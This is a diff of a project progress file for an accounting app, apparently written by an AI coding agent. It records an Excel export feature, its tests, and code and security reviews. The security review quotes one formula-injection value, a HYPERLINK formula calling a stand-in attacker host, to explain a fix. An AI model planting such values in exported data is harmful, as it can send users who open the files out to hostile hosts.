@@ -2084,7 +2084,7 @@ as usual:
 | --- | ---------------- | ---------- | ------ |
 | 73  | Global Search    | Masters    | ✅     |
 | 74  | Excel Import     | Masters    | ⬜     |
-| 75  | Excel Export     | Reports    | ⬜     |
+| 75  | Excel Export     | Reports    | ✅     |
 | 76  | PDF Generation   | Reports    | 🟨     |
 | 77  | Barcode Billing  | Sales      | ⬜     |
 | 78  | Audit Logs       | Platform   | ⬜     |
@@ -2260,9 +2260,99 @@ as usual:
 > browser click-through (Backup Now button, history table, Restore
 > dialog) was **not** performed — no Chromium/Playwright tooling was
 > available in this session's shell; recommend the user click through
-> `/administration/backup` themselves before merging. Git Workflow
-> (branch/commit/PR/merge) not yet done — pending user decision, see
-> `progress-tracker.md`'s matching dated entry.
+> `/administration/backup` themselves before merging. **Committed directly
+> to `main` 2026-09-19** (commit `8048562`), per explicit user direction —
+> no feature branch/PR for this one.
+
+> **#75 Excel Export implemented 2026-09-19** (spec 77,
+> `context/feature-specs/77-excel-export.md`), per explicit user direction to
+> pick this item next (ahead of #74 Excel Import in pick order, though #74
+> remains earlier in this file's own phase sequence). Adds `exceljs` as the
+> only new dependency (confirmed absent beforehand) and a new shared,
+> domain-agnostic `src/lib/excel-export.ts` (`exportToExcelBuffer`) plus its
+> `src/types/report-export.ts` contract (`ReportExportColumn`/`Table`/`Input`)
+> — zero imports from `src/modules/**` or `@prisma/client`, no permission
+> check, no `companyId`, matching `voucher-validation.ts`'s "engines/
+> utilities don't gate, callers gate" convention. Handles sheet-name
+> sanitization (≤31 chars, forbidden-character stripping, empty-after-strip
+> fallback), bold+frozen header row, an optional title row, an optional
+> totals footer, auto column width (explicit `width` always wins), and
+> `#,##0.00`/`DD-MMM-YYYY`/literal-`%`-suffix formatting for currency/date/
+> percent columns respectively — the last deliberately not Excel's native
+> `0.00%` format, since this codebase's own `ratePercent` convention already
+> stores the display number (e.g. `18` for "18%"), not a 0–1 fraction, which
+> Excel's native percent format would incorrectly rescale. Switches to
+> `exceljs`'s streaming `WorkbookWriter` above 5,000 rows in a single table to
+> bound memory use, sharing one `writeTable` function with the in-memory path
+> (`WorkbookWriter extends Workbook` in `exceljs`'s own types, confirmed
+> directly rather than assumed).
+>
+> **Reference wiring** (the spec's own required scope — the other ten Phase
+> 10 report screens' Export buttons remain the pre-existing disabled stub,
+> a named follow-up, not silently assumed done): Trial Balance
+> (`64-trial-balance.md`) gained `toTrialBalanceExportTable` in its own
+> `src/engines/reporting/trial-balance.ts` (pure, no I/O — flattens the
+> group-hierarchy tree into `Particulars`/`Indent Level`/`Debit`/`Credit`
+> rows plus a Grand Total footer, depth-first, mirroring
+> `TrialBalanceGroupTree`'s own render order and figures exactly rather than
+> recomputing anything), a new download Route Handler at
+> `/reports/trial-balance/export` (re-checks `reports`/`export` permission
+> independently of the page's own `reports`/`view` check — the button being
+> rendered is never treated as authorization — then re-derives the report via
+> the unmodified `trialBalanceReportService`, which itself re-validates
+> financial-year company-ownership), and `ReportExportButton` extended with
+> an optional `downloadUrl` prop: a plain server-renderable `<a download>`
+> link (mirroring `sales-invoice-download-pdf-button.tsx`'s existing
+> convention, no client JS) when given, otherwise byte-for-byte the original
+> disabled stub — confirmed the other 9 existing callers (`profit-and-loss`,
+> `cash-flow`, `balance-sheet`, `reports/gst`, the six `gst/*` screens via
+> `GstReportExportButton`, untouched) still pass no prop and render
+> identically to before.
+>
+> **Code review (parallel subagent): APPROVE, 0 CRITICAL/HIGH/MEDIUM, 1 LOW
+> (not fixed)** — the >5,000-row streaming-path test doesn't assert cell
+> formatting the same way the in-memory-path test does; a coverage gap, not a
+> defect, left as a named optional follow-up.
+>
+> **Security review (parallel subagent) found 1 MEDIUM, fixed**: a
+> `type: "string"` column's cell values (e.g. Trial Balance's `Particulars`
+> column, sourced from `Ledger`/`LedgerGroup.name`) were written to the
+> worksheet with no escaping — since those names are validated only for
+> length, not character content, a ledger/group named e.g.
+> `=HYPERLINK("http://attacker.example",...)` would reach the exported file
+> as a live formula the moment a *different*, more-trusted user (anyone with
+> `reports:export`) opens it — the classic OWASP CSV/Formula Injection class,
+> and in tension with this project's own Offline-First posture since the
+> resulting formula could reach the network entirely outside this app. Fixed
+> by prefixing any string cell value beginning with `= + - @` or a
+> tab/CR with a leading apostrophe (forcing literal-text interpretation),
+> applied centrally in `excel-export.ts`'s `writeTable` to every row, the
+> totals footer, and the title row alike — so every current and future
+> `ReportExportTable` caller (Excel Import's Template Download, PDF
+> Generation) gets the protection for free, not just Trial Balance. Two LOW
+> findings accepted as-is: `sanitizeSheetName` doesn't additionally strip a
+> leading/trailing apostrophe (Excel's own other forbidden-first/last-char
+> rule) — unreachable today since `toTrialBalanceExportTable` always emits
+> the hardcoded literal `"Trial Balance"`, flagged for the next caller that
+> passes a user/data-derived sheet name; and the new route has no rate
+> limiting, matching this app's existing no-rate-limiting convention
+> app-wide, not a regression. Authorization, information disclosure, and the
+> `exceljs` dependency itself (correctly spelled, offline, no
+> network-calling transitive deps) were all confirmed clean.
+>
+> Re-verified after the fix: `npx tsc --noEmit`, `npx eslint src prisma` (0
+> errors, same 2 pre-existing unrelated warnings), `npx vitest run` (159
+> files, **2172 tests** — 27 new: 17 `excel-export.test.ts`, 4
+> `trial-balance.test.ts`, 6 `route.test.ts`), `next build`
+> (`/reports/trial-balance/export` in the route table). Browser-verified
+> live end-to-end (`next dev` + Playwright): logged in as `admin`, opened
+> `/reports/trial-balance`, clicked Export, confirmed a real downloaded
+> `.xlsx` (parsed back with `exceljs` — correct sheet name, header row,
+> flattened group/ledger rows, Grand Total footer) with zero console errors;
+> separately confirmed `/reports/profit-and-loss`'s own Export button is
+> still the disabled stub, unaffected by the `ReportExportButton` change.
+> Git Workflow (branch/commit/PR/merge) not yet done — pending user
+> decision, see `progress-tracker.md`'s matching dated entry.
 
 ---
 
